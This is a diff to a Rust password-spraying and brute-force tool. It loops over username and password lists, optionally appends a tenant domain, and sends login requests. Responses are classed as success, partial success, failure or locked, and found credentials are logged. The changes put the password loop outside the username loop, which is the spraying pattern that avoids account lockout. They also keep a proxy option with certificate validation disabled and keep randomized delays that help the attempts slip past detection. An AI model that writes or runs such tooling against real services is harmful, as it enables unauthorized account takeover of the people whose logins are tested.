@@ -3,17 +3,15 @@ mod constants;
 mod structs;
 
 use args::Args;
-use chrono::Utc;
 use clap::Parser;
 use constants::{ENDPOINTS, ERROR_CODES};
 use rand::Rng;
 use reqwest::{blocking::Client, blocking::Response, Proxy, StatusCode};
 use simplelog::{
-    debug, error, info, trace, ColorChoice, CombinedLogger, Config, TermLogger, TerminalMode,
-    WriteLogger,
+    debug, error, info, trace, ColorChoice, CombinedLogger, ConfigBuilder, TermLogger,
+    TerminalMode, WriteLogger,
 };
 use std::{
-    ffi::OsStr,
     fs::{create_dir_all, File},
     io::{BufRead, BufReader, Read, Result, Seek, SeekFrom},
     thread,
@@ -95,34 +93,25 @@ fn parse_response(response: Response) -> Foo {
 }
 
 fn main() -> Result<()> {
-    let mut args = Args::parse();
+    let args = Args::parse();
 
     create_dir_all("results")?;
 
-    if args.outfile.file_name() == Some(OsStr::new("results.log")) {
-        let file_name = format!(
-            "./results/results-{}.log",
-            Utc::now().format("%Y-%m-%dT%H.%M.%S")
-        );
-        args.outfile.set_file_name(OsStr::new(file_name.as_str()));
-    } else {
-        let file_name = format!(
-            "./results/{}",
-            args.outfile.file_name().unwrap().to_string_lossy()
-        );
-        args.outfile.set_file_name(OsStr::new(file_name.as_str()));
-    }
+    let mut config_builder = ConfigBuilder::new();
+
+    config_builder.add_filter_ignore_str("reqwest::connect");
+    config_builder.add_filter_ignore_str("reqwest::async_impl::client");
 
     let _ = CombinedLogger::init(vec![
         TermLogger::new(
             args.verbose.log_level_filter(),
-            Config::default(),
+            config_builder.build(),
             TerminalMode::Stdout,
             ColorChoice::Auto,
         ),
         WriteLogger::new(
             args.verbose.log_level_filter(),
-            Config::default(),
+            config_builder.build(),
             File::create(args.outfile.clone()).unwrap(),
         ),
     ]);
@@ -131,11 +120,13 @@ fn main() -> Result<()> {
 
     let mut client = Client::new();
 
-    if !args.proxy.is_empty() {
-        info!("Proxy set to: {}...", args.proxy);
+    if !args.proxy.is_none() {
+        let proxy = args.proxy.unwrap();
+
+        info!("Proxy set to: <b>{}</>", proxy);
 
         client = Client::builder()
-            .proxy(Proxy::all(args.proxy).unwrap())
+            .proxy(Proxy::all(proxy).unwrap())
             .danger_accept_invalid_certs(true)
             .build()
             .unwrap();
@@ -147,23 +138,26 @@ fn main() -> Result<()> {
     let total_candidates_count =
         username_buf_reader.by_ref().lines().count() * password_buf_reader.by_ref().lines().count();
 
-    info!("Starting the attack...☕");
+    info!(
+        "Saving output to: <b>{}</>",
+        args.outfile.file_name().unwrap().to_string_lossy()
+    );
 
     let mut i: u128 = 1;
 
-    username_buf_reader.seek(SeekFrom::Start(0))?;
+    password_buf_reader.seek(SeekFrom::Start(0))?;
 
-    'outer: for username in username_buf_reader.by_ref().lines() {
-        let mut username = username.unwrap();
+    'outer: for password in password_buf_reader.by_ref().lines() {
+        let password = password.unwrap();
 
-        if !args.tenant.is_empty() {
-            username = format!("{}@{}", username, args.tenant);
-        }
+        username_buf_reader.seek(SeekFrom::Start(0))?;
 
-        password_buf_reader.seek(SeekFrom::Start(0))?;
+        for username in username_buf_reader.by_ref().lines() {
+            let mut username: String = username.unwrap();
 
-        for password in password_buf_reader.by_ref().lines() {
-            let password: String = password.unwrap();
+            if !args.tenant.as_ref().is_none() {
+                username = format!("{}@{}", username, args.tenant.as_ref().unwrap());
+            }
 
             let result: Foo = parse_response(send_request(
                 client.clone(),
@@ -174,21 +168,21 @@ fn main() -> Result<()> {
 
             let mut success = false;
             let formatted_output = format!(
-                "[<b>{}/{}</>] (<cyan>{}</>) {}:{}",
+                "[<b>{}/{}</>] [<cyan>{}</>] {}:{}",
                 i, total_candidates_count, args.resource_principal, username, password
             );
 
             match result.r#type {
+                "FAILURE" => debug!("{} -> <yellow>{}</>", formatted_output, result.message),
+                "LOCKED" => debug!("{} -> <magenta>{}</>", formatted_output, result.message),
+                "PARTIAL_SUCCESS" => {
+                    success = true;
+                    info!("{} -> <blue>{}</>", formatted_output, result.message);
+                }
                 "SUCCESS" => {
                     success = true;
                     info!("{} -> <green>{}</>", formatted_output, result.message);
                 }
-                "PARTIAL_SUCCESS" => {
-                    success = true;
-                    info!("{} -> <magenta>{}</>", formatted_output, result.message);
-                }
-                "FAILURE" => debug!("{} -> <yellow>{}</>", formatted_output, result.message),
-                // XXX: result.0 == 3
                 _ => error!("{} -> <red>{}</>", formatted_output, result.message),
             }
 
@@ -203,7 +197,7 @@ fn main() -> Result<()> {
             i += 1;
 
             let jitter = rand::thread_rng().gen_range(0..=args.jitter);
-            
+
             thread::sleep(Duration::from_secs(args.delay + jitter));
         }
     }
